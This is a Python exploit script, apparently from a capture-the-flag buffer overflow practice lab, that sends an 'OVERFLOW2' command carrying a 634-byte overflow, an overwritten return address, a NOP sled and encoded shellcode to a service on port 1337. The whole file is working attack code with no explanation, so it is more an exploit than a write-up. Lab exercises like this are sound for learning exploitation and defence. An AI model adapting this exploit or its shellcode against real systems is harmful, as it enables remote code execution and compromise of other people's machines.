import socket

ip = "10.10.116.56"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
# bad char \x00\x23\x3c\x83\xba
payload = "\xd9\xc4\xd9\x74\x24\xf4\x58\xbb\xcb\xed\xf0\x64\x31\xc9\xb1\x52\x31\x58\x17\x03\x58\x17\x83\x23\x11\x12\x91\x4f\x02\x51\x5a\xaf\xd3\x36\xd2\x4a\xe2\x76\x80\x1f\x55\x47\xc2\x4d\x5a\x2c\x86\x65\xe9\x40\x0f\x8a\x5a\xee\x69\xa5\x5b\x43\x49\xa4\xdf\x9e\x9e\x06\xe1\x50\xd3\x47\x26\x8c\x1e\x15\xff\xda\x8d\x89\x74\x96\x0d\x22\xc6\x36\x16\xd7\x9f\x39\x37\x46\xab\x63\x97\x69\x78\x18\x9e\x71\x9d\x25\x68\x0a\x55\xd1\x6b\xda\xa7\x1a\xc7\x23\x08\xe9\x19\x64\xaf\x12\x6c\x9c\xd3\xaf\x77\x5b\xa9\x6b\xfd\x7f\x09\xff\xa5\x5b\xab\x2c\x33\x28\xa7\x99\x37\x76\xa4\x1c\x9b\x0d\xd0\x95\x1a\xc1\x50\xed\x38\xc5\x39\xb5\x21\x5c\xe4\x18\x5d\xbe\x47\xc4\xfb\xb5\x6a\x11\x76\x94\xe2\xd6\xbb\x26\xf3\x70\xcb\x55\xc1\xdf\x67\xf1\x69\x97\xa1\x06\x8d\x82\x16\x98\x70\x2d\x67\xb1\xb6\x79\x37\xa9\x1f\x02\xdc\x29\x9f\xd7\x73\x79\x0f\x88\x33\x29\xef\x78\xdc\x23\xe0\xa7\xfc\x4c\x2a\xc0\x97\xb7\xbd\xe5\x6c\x9b\x03\x92\x70\xe3\x6a\x3e\xfc\x05\xe6\xae\xa8\x9e\x9f\x57\xf1\x54\x01\x97\x2f\x11\x01\x13\xdc\xe6\xcc\xd4\xa9\xf4\xb9\x14\xe4\xa6\x6c\x2a\xd2\xce\xf3\xb9\xb9\x0e\x7d\xa2\x15\x59\x2a\x14\x6c\x0f\xc6\x0f\xc6\x2d\x1b\xc9\x21\xf5\xc0\x2a\xaf\xf4\x85\x17\x8b\xe6\x53\x97\x97\x52\x0c\xce\x41\x0c\xea\xb8\x23\xe6\xa4\x17\xea\x6e\x30\x54\x2d\xe8\x3d\xb1\xdb\x14\x8f\x6c\x9a\x2b\x20\xf9\x2a\x54\x5c\x99\xd5\x8f\xe4\xb9\x37\x05\x11\x52\xee\xcc\x98\x3f\x11\x3b\xde\x39\x92\xc9\x9f\xbd\x8a\xb8\x9a\xfa\x0c\x51\xd7\x93\xf8\x55\x44\x93\x28"

postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
